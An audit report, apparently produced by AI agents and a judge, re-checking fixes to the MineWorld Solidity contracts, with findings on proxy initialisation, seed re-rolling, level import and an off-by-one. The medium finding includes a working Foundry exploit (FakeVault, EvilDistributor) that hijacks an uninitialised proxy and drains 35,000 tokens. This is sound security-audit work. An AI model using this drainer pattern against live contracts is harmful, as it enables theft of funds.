# Audit report

> MineWorldCraft – second re-check: fixes for IMD Swarm re-check 8c7ba957
>
> Repo: https://github.com/AdamNakamoto/MineWorld   Commit: 4de227d
> Previous: audit 0792975e (on ba2a8ed), re-check 8c7ba957 (on 49830f2). Every finding of 8c7ba957 and its fix
> (file:line and the tests that cover it) is in AUDIT.md section 9. forge test: 235 passed, 10 fork tests skipped
> without a fork (all 10 pass on a Robinhood Chain fork). The collection was also renamed to "I'M DIO" (symbol DIO);
> the code identifiers (MineWorldCrafters etc.) kept their names.
>
> Please verify each fix and check the changed code for anything new:
> 1. MEDIUM distributor hijack: MiningSites.initialize runs only inside the proxy's own constructor or when called by
>    the vault's owner; MineVault.acceptDistributor requires owner() == the vault's owner, vault() == this vault and
>    predecessor() == the current distributor. Your HijackNamesOwnerTest is in the suite unchanged and passes.
> 2. MEDIUM Arbitrum blockhash (with LOW 6): the reveal is redesigned. reveal(secret) (owner, sale closed, checked
>    against seedCommit) publishes the secret and sets entropyBlock = ArbSys.arbBlockNumber() + 1; seal() (anyone)
>    sets seed = keccak256(secret, ArbSys.arbBlockHash(entropyBlock)); past the 256-block window seal() moves
>    entropyBlock to the next L2 block. Expiry comes from block numbers, not a try/catch (no gas-starvation re-roll).
>    Falls back to block.number/blockhash only where 0x64 has no code (dev chains). Measured on Robinhood Chain:
>    L2 blocks every 0.101 s, arbBlockHash answers for the last 256 blocks.
> 3. LOW replacement pays again: a replacement records its predecessor and imports each player's site, level,
>    settled and claimed (the higher of each) on first touch; bookOf() reads through the chain. Your
>    ReplacementResetsSettledTest is in the suite (adapted: re-opening reverts AlreadyOpen, a zero claim reverts
>    NothingToClaim).
> 4. LOW old contract keeps selling: openSite, upgradeSite and claim revert NotActive unless this contract is the
>    vault's distributor.
> 5. LOW rate cut: upgradeSite(uint256 maxCost, uint256 minRateBps) reverts RateBelowMin.
> 6. LOW owner-only knowledge window: solved by #2 (the secret is public before the entropy exists; anyone seals).

| | |
|---|---|
| Repository | https://github.com/AdamNakamoto/MineWorld.git |
| Commit | `4de227d3d734a7efb7286bbf1050c9b0e632874f` |
| Job | `52b534f9-f11d-4ef7-880f-053694cef8be` |
| Judged | 2026-10-15 00:18 UTC |
| Findings | 1 medium · 2 low · 1 info |

Four agents audited the code as it is at `4de227d`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. Medium: MiningSites.initialize's owner guard reads owner() from the caller-supplied vault_, so a stranger can set up a proxy left uninitialised with a fake vault, take its upgrade key, and (after an upgrade t

`contracts/src/MiningSites.sol:190`

```
        if (address(this).code.length != 0 && msg.sender != vault_.owner()) revert InitializeOutsideConstructor();
```

Re-check 8c7ba957 #1 is only partly closed. The guard added at MiningSites.sol:190 compares msg.sender with vault_.owner(), but vault_ is an argument of the call being guarded, and every later check in initialize (vault_.token(), vault_.distributor()/pendingDistributor(), DAILY_LIMIT() via MAX_DAILY_CAP()) reads the same caller-chosen contract. Nothing ties vault_ to the real MineVault. So in the 'late proxy' state the suite explicitly supports (test_onlyTheOwnerSetsUpALateProxy: an ERC1967Proxy deployed with empty data, proposed by the vault's owner, to be initialised by the owner later) a stranger calls initialize first with a contract of their own answering owner()=stranger, token()=$MINE, distributor()=the proxy, DAILY_LIMIT()=35,000e18, and becomes the proxy's owner and UUPS upgrader (OwnedUUPS._authorizeUpgrade is onlyOwner). Consequences, in order of severity: (a) the owner's own initialize reverts InvalidInitialization, the proposed address is burnt, and the owner must deploy, propose and wait DISTRIBUTOR_DELAY (2 days) again; repeatable for every proxy left uninitialised. (b) MineVault.acceptDistributor's three reads (owner(), vault(), predecessor()) do not protect against this: the stranger, as owner, calls upgradeToAndCall to an implementation whose owner()/vault()/predecessor() return the real vault's owner, the real vault and the current distributor, and whose other function calls MineVault.release; if the owner then calls acceptDistributor it passes and the stranger's code mints DAILY_LIMIT (35,000 $MINE) a day until replaced (two more days). (c) In the state test_InitializeOnlyInTheConstructorOrByTheVaultsOwner calls 'a launch done in two steps by mistake' (the vault's constructor names a proxy deployed uninitialised), the same call makes the stranger the owner of the vault's live distributor: no acceptance is needed, an upgrade to a drainer mints 35,000 $MINE a day at once. The documented path (initialize in the proxy's constructor, Deploy.s.sol, test_safeReplacementPath) is not affected, so this is a deviation-only risk, but the NatSpec of initialize ('nobody else can set a proxy up, whatever state it is left in'), MineVault's step 3 ('nobody else can ever set a proxy up'), acceptDistributor's NatSpec ('none can be set up by anyone but this vault's owner') and AUDIT.md sections 5 and 9 #1 state a guarantee the code does not give, and the suite tests the late path only against the real vault. Fix (any keeps the owner-only replacement design): require address(this).code.length == 0 unconditionally (constructor-only; drop the late path, its NatSpec and test_onlyTheOwnerSetsUpALateProxy), or pin the vault in the implementation as a constructor immutable and require vault_ == that immutable before trusting vault_.owner(), or have acceptDistributor compare the pending proxy's ERC-1967 implementation slot against an implementation recorded at proposeDistributor (which also stops any other code swap before acceptance). Update the NatSpec and AUDIT.md either way. Reported by three specialists (permissions, economics, flow); merged here.

**Reproduction**

State: vault V (owner O, distributor D0 initialised in its constructor), replacement proxy P = new ERC1967Proxy(impl, "") (uninitialised), O calls V.proposeDistributor(P). Input: attacker A deploys FakeVault F {owner()=A, token()=$MINE, distributor()=P, pendingDistributor()=0, DAILY_LIMIT()=35_000e18} and calls P.initialize($MINE, F, A, A, A, 1, 3_500e18, 35_000e18). Expected (the fix's claim, InitializeOutsideConstructor): revert. Actual: succeeds, P.owner()==A, P.vault()==F; O's own P.initialize(...) reverts InvalidInitialization. A then calls UUPSUpgradeable(P).upgradeToAndCall(E, "") with E answering owner()=O, vault()=V, predecessor()=D0 and drain(to, amt) -> V.release(to, amt). After 2 days O calls V.acceptDistributor(): expected NotOwnersDistributor/WrongVault/NotASuccessor, actual it succeeds and V.distributor()==P; A calls P.drain(A, 35_000e18) and $MINE.balanceOf(A)==35,000e18. Verified: cd contracts && forge test --match-path test/scratch/FakeVaultHijack.t.sol fails on 4de227d with 'the vault minted $MINE to the stranger: 35000000000000000000000 != 0'; the economics specialist's variant (test/scratch/StrangerInitializesWithOwnVault.t.sol) fails at 'a stranger initialised the proxy the owner proposed'. Both pass once a stranger's late initialize reverts.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";
import {MineToken} from "src/MineToken.sol";
import {MineVault} from "src/MineVault.sol";
import {MiningSites} from "src/MiningSites.sol";

/// A vault of the stranger's own making: it answers everything MiningSites.initialize asks of `vault_`.
contract FakeVault {
    address public owner;
    address public token;
    address public distributor;

    constructor(address owner_, address token_, address distributor_) {
        owner = owner_;
        token = token_;
        distributor = distributor_;
    }

    function pendingDistributor() external pure returns (address) {
        return address(0);
    }

    function DAILY_LIMIT() external pure returns (uint256) {
        return 35_000e18;
    }
}

/// The implementation the stranger upgrades the hijacked proxy to: it answers acceptDistributor's three reads with
/// the real vault's values and asks the real vault to mint.
contract EvilDistributor {
    address public immutable owner;
    address public immutable vault;
    address public immutable predecessor;

    constructor(address owner_, address vault_, address predecessor_) {
        owner = owner_;
        vault = vault_;
        predecessor = predecessor_;
    }

    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function drain(address to, uint256 amount) external {
        MineVault(vault).release(to, amount);
    }
}

/// Re-check 8c7ba957 #1, the state its fix's NatSpec covers ("whatever state it is left in"): a replacement proxy on
/// chain, uninitialised, proposed by the owner, which the vault's owner means to initialise itself. The guard in
/// MiningSites.initialize compares msg.sender with the owner of the `vault_` the caller passes, so a stranger passes a
/// vault of its own and is let through; as the proxy's owner it then upgrades it to code that answers the vault's
/// three checks with the right values, and the vault accepts it and mints to the stranger.
contract FakeVaultHijackTest is Test {
    address owner = makeAddr("owner");
    address treasury = makeAddr("treasury");
    address attacker = makeAddr("attacker");

    MineToken token;
    MiningSites impl;
    MineVault vault;

    function setUp() public {
        token = new MineToken(address(this), address(0), 0);
        impl = new MiningSites();
        address predicted = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 1);
        vault = new MineVault(token, owner, predicted);
        address sites = address(
            new ERC1967Proxy(
                address(impl),
                abi.encodeCall(
                    MiningSites.initialize,
                    (IERC20(address(token)), vault, owner, treasury, owner, 1, 1_500e18, 35_000e18)
                )
            )
        );
        assertEq(sites, predicted);
        token.setMinter(address(vault));
        token.renounceOwnership();
    }

    function test_StrangerInitialisesTheLateProxyWithItsOwnVault() public {
        // The owner deploys the replacement proxy uninitialised and proposes it, meaning to initialise it itself.
        address replacement = address(new ERC1967Proxy(address(impl), ""));
        vm.prank(owner);
        vault.proposeDistributor(replacement);

        // A stranger gets there first, with a vault of its own that names the stranger as owner.
        FakeVault fake = new FakeVault(attacker, address(token), replacement);
        vm.prank(attacker);
        (bool hijacked,) = replacement.call(
            abi.encodeCall(
                MiningSites.initialize,
                (IERC20(address(token)), MineVault(address(fake)), attacker, attacker, attacker, 1, 3_500e18, 35_000e18)
            )
        );

        if (hijacked) {
            // The stranger owns the proxy now: it upgrades it to code that answers the vault's checks correctly.
            EvilDistributor evil = new EvilDistributor(owner, address(vault), vault.distributor());
            vm.prank(attacker);
            UUPSUpgradeable(replacement).upgradeToAndCall(address(evil), "");

            // The owner's own initialise reverts, but its acceptDistributor two days later goes through.
            vm.warp(vm.getBlockTimestamp() + 2 days);
            vm.prank(owner);
            (bool accepted,) = address(vault).call(abi.encodeCall(MineVault.acceptDistributor, ()));
            if (accepted) {
                vm.prank(attacker);
                EvilDistributor(replacement).drain(attacker, 35_000e18);
            }
        }

        // What the fix claims: nobody but the vault's owner sets a proxy up, so one a stranger set up is never
        // accepted and never mints.
        assertEq(token.balanceOf(attacker), 0, "the vault minted $MINE to the stranger");
        assertTrue(vault.distributor() != replacement, "the vault accepted a distributor a stranger set up");
        assertFalse(hijacked, "a stranger initialised the late proxy by passing a vault of its own");
    }
}
```

### 2. Low: seal()'s expiry branch re-rolls the seed for free and without limit: once a 256-block (about 26 s) window passes with nobody sealing, whoever is watching (the owner included) can reject the public can

`contracts/src/MineWorldCrafters.sol:273`

```
        if (current - b > ENTROPY_WINDOW) {
            uint256 next = current + 1;
            entropyBlock = next;
            emit EntropyBlockSet(next);
            return 0;
        }
```

The redesign for 8c7ba957 #2/#6 makes the seed keccak256(revealedSecret, hash of L2 block entropyBlock), sealable by anyone, which does stop the owner from choosing or pre-knowing a seed. But from the block after entropyBlock both inputs are public, so every party can compute the exact seed and every token's rarity before it is sealed, and if nobody seals within ENTROPY_WINDOW (256 L2 blocks, about 26 s on Robinhood Chain by AUDIT.md section 9's own measurement) seal() does not fix that outcome: it moves entropyBlock to current + 1, returns 0, costs nothing, needs no privilege, and may be repeated indefinitely. Any party that dislikes a candidate therefore holds a free option: do nothing for 26 s, call seal() to move the block on, read the next candidate, and either seal it or wait again. The only thing that stops it is a third party sealing inside each 26-second window, and nothing enforces or rewards that: the panel's 'Lock in the reveal' button is manual, no sealer bot is deployed, and the reveal is naturally sent at a time of the owner's choosing. The owner (up to walletLimit tokens, 10 by default) or any large holder with a bot gets a selection oracle: with 10 tokens, P(at least one Legendary, ~6% each) per draw is about 46%, so a handful of 26-second cycles suffices; and a single stranger needs only the owner's own seal to miss one window (a stuck wallet transaction is enough) to start. The NatSpec on seal names the mechanism ('letting the window pass is the only way to get a different seed ... anyone who seals in time stops it') and AUDIT.md section 6 accepts 'sealing within 256 L2 blocks', but the contract header's trust claim ('the owner can't pick looks') holds only while someone else seals within 26 s of every entropy block, and no test bounds the number of re-rolls (test_AnExpiredEntropyBlockMovesOn shows one move-on; test_OwnerCantGrindItsOwnCrafterToLegendary only varies the reveal block). Fix options that keep the single owner reveal step: (a) make expiry deterministic rather than a redraw, e.g. after the first expiry derive the fallback from data fixed at reveal time (seed = keccak256(secret, entropyBlock) with no new hash), so waiting yields at most one known alternative; (b) let only the owner move the entropy block on after expiry, so a stranger can never start a re-roll, and have the deploy script or a bot send seal() in the block after the entropy block; (c) at least pay a small bounty to a successful seal() caller and document that the 'anyone seals' guarantee is only as good as that bot. Reported by three specialists (permissions, flow, math); merged here.

**Reproduction**

Local path (block.number/blockhash; the ArbSys path is the same arithmetic with arbBlockNumber/arbBlockHash). State: sale closed, owner calls reveal(secret) at block 1000, so entropyBlock e = 1001. At block 1002 everyone computes cand1 = keccak256(abi.encode(secret, blockhash(1001))) and revealStatus() == Sealable. Input: nobody seals; at block 1258 (1258 - 1001 = 257 > 256) an unprivileged attacker calls seal(). Expected if the seed were fixed once its inputs are public: cand1 sealed, or at least unchangeable by the waiting party. Actual: seal() returns 0 and sets entropyBlock = 1259; at 1260 cand2 = keccak256(secret, blockhash(1259)) != cand1; at 1516 seal() again returns 0 and sets entropyBlock = 1517; at 1518 cand3 differs from both; the attacker likes cand3 and seal() at 1518 sets seed == cand3. Verified: cd contracts && forge test --match-path test/scratch/Leads.t.sol --match-test test_ExpiryGivesAFreeReroll passes on 4de227d asserting exactly these values (three distinct candidates, the third chosen by the attacker, each move-on costing only gas).

### 3. Low: A level bought on a predecessor above the replacement's launch top (5) is clamped at every read-through hop and permanently at import, so a later addLevel never restores it and the player must buy it

`contracts/src/MiningSites.sol:261`

```
        if (level > top) level = top;
```

Fix #3 of 8c7ba957 carries each player's site, level, settled and claimed over from the predecessor. _import (MiningSites.sol:260-264) and bookOf (:285-286) clamp the predecessor's level to this contract's maxLevel() before storing or returning it. initialize always starts a replacement with the launch's 4 costs (top 5), so unless the owner remembers to call addLevel on the replacement before acceptDistributor, every player who paid $MINE for a level above 5 on the predecessor loses it: (1) per hop, a third contract whose top is 8 still reads a player at 5 if the middle hop's top was 5, because the middle hop's bookOf already clamped before passing it on; (2) for good, _import writes site.level = uint8(top) and sets imported[player], so the predecessor is never read again and a later addLevel on the replacement does not restore the level. The documented invariant ('each player's site, level, settled and claimed carry over', NatSpec, AUDIT.md 3.4/6/9 #3) holds only for levels at or below the launch top; the clamp itself is documented ('held at the top'), but neither its permanence after addLevel nor the per-hop loss is, and the suite's test_ALevelAboveTheNewTopIsHeldAtTheTop checks only one hop and never adds the level back. The vault loses nothing; the player has to pay the level-6+ cost (1,000 $MINE in the test; whatever the owner set) a second time. Fix: store and pass the raw level (uint8 holds MAX_LEVELS = 20) and clamp only where it is used (levelRateBps: min(level, rates.length); _nextLevel: revert MaxLevel when level >= top; siteLevel may show the clamped value), or at least document in MineVault's replacement steps that the predecessor's extra levels must be added on the replacement before acceptDistributor, and clamp only in views.

**Reproduction**

State: first MiningSites with addLevel(1000e18, 10000) (top 6), alice at level 6 (paid 1,000 $MINE for it). Replace it per the documented steps (propose the predicted address, deploy initialised, accept after 2 days): second.maxLevel() == 5 and second.siteLevel(alice) == 5. Replace again with a third on which the owner calls addLevel three times before acceptance (top 8): expected third.siteLevel(alice) == 6 (she paid for it and 6 <= 8); actual 5, because second.bookOf clamped. Alice then claims 10e18 on the third (its _import writes 5) and the owner calls addLevel again (top 9): expected 6, actual 5, permanently, and third.upgradeCost(6) == 1,000e18 must be paid again. Verified: cd contracts && forge test --match-path test/scratch/Leads.t.sol --match-test test_LevelPaidForIsLostThroughAHopAndAfterAnImport passes on 4de227d asserting the actual values (both assertEq(..., 5) hold).

### 4. Info: revealStatus() reports Sealable one block longer than a transaction can seal in: a client acting on the last Sealable block moves the entropy block on instead

`contracts/src/MineWorldCrafters.sol:294`

```
        return current - b > ENTROPY_WINDOW ? RevealStatus.Expired : RevealStatus.Sealable;
```

Off-by-one between the view and the write at the window's edge. An eth_call runs at the latest block's number (arbBlockNumber() or block.number), while the transaction it triggers executes in at least the next block. revealStatus() returns Sealable while current - b <= 256, i.e. up to and including latest == b + 256; a seal() sent on seeing that lands with current >= b + 257, takes the expiry branch (:273), moves the entropy block on and returns 0 rather than sealing. Harmless on its own (seal again one block later), but this is the view the panel and any bot are told to check (NatSpec :286-287), and together with the re-roll finding above a bot that waits for the last Sealable block is exactly the one that loses the seed it computed. Fix: return Sealable only while current - b < ENTROPY_WINDOW (one block of margin), or document that clients must seal with at least one block to spare.

**Reproduction**

b = entropyBlock = 1001. At latest block 1257 (1257 - 1001 = 256): revealStatus() == Sealable (the suite's test_AnExpiredEntropyBlockMovesOn also asserts this at e + 256). A seal() transaction sent on seeing that is included at block >= 1258: 1258 - 1001 = 257 > 256, so seal() returns 0 and sets entropyBlock = 1259. Expected by the caller: the seed set from block 1001's hash; actual: no seed, a new entropy block. Verified: cd contracts && forge test --match-path test/scratch/Leads.t.sol --match-test test_StatusSaysSealableOnTheLastBlockATransactionCannotSealIn passes on 4de227d asserting exactly this.

---

Judge's submission `9ada74b73fc579c0c3c9bb7bf6c2e3f5d3dcb779fda86acc2bcefa78fa2621dc`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
